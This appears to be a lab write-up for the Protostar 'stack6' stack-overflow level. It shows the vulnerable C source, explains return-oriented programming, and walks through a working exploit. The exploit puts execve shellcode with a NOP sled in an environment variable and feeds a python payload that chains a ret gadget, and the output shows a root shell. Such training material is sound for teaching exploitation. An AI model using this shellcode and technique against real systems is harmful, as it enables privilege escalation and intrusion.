# Protostar - Stack 6

### About ###

>Stack6 looks at what happens when you have restrictions on the return address.
>
>This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.
>
>It is strongly suggested you experiment with multiple ways of getting your code to execute here.
>
>This level is at `/opt/protostar/bin/stack6`


### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

### Solution 

This challenge is an introduction to the concepts of *Return Oriented Programming* or ROP, we won't be able to execute directly the code injected in the stack, because its address will begin with `0xbfxxxxxx`.
We have to use code already available in another section of the program, such as `.text`, to launch our exploit.

ROP is based on the use of gadgets. Gadgets are sequences of instructions usually ending with the instruction `ret`. Since `ret` jumps to the value located at the top of the stack, it is possible to chain gadgets together in order to exploit a vulnerable process. More information can be found [here](https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf) [1].

ROP is usually used to bypass software protections such as ASLR or DEP. But in our case, we will use it to bypass the verification on the return address. Instead of the address of our shellcode, we will overwrite `eip` with the address of another `ret` instruction, followed by the address of our shellcode.

To find another instruction `ret` we can use `objdump` and pick the first one for example.

```
user@protostar:/tmp$ objdump -d /opt/protostar/bin/stack6 | grep ret
 804835f:      	c3                     	ret
 8048454:      	c3                     	ret
 8048482:      	c3                     	ret
 80484f9:      	c3                     	ret
 8048508:      	c3                     	ret
 8048514:      	c3                     	ret
 8048579:      	c3                     	ret
 804857d:      	c3                     	ret
 80485a9:      	c3                     	ret
 80485c7:      	c3                     	ret
```
Our shellcode will still be located in an environment variable.

```
user@protostar:/tmp$ export SHELLCODE=$(python -c "print '\x90'*200+'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
user@protostar:/tmp$ ./getenv SHELLCODE
0xbffff8b8
```

Finally, the execution will be as follows:

 * `ret`, the last instruction of the function `main`, is executed and moves the address of another instruction `ret` into `eip`. Since this instruction is not on the stack, its address does not begin with `0xbfxxxxxx`.
 * The second `ret` is executed and moves the address of the shellcode into `eip`.
 * The shellcode is executed and we have the privileges of root.

```
user@protostar:/tmp$ (python -c "print 'A'*$((80))+'\x5f\x83\x04\x08\xb8\xf8\xff\xbf'"; cat;) | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_AAAAAAAAAAAA_����
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
 
**References**

 * [1] Return-oriented Programming:
Exploitation without Code Injection, [https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf](https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf)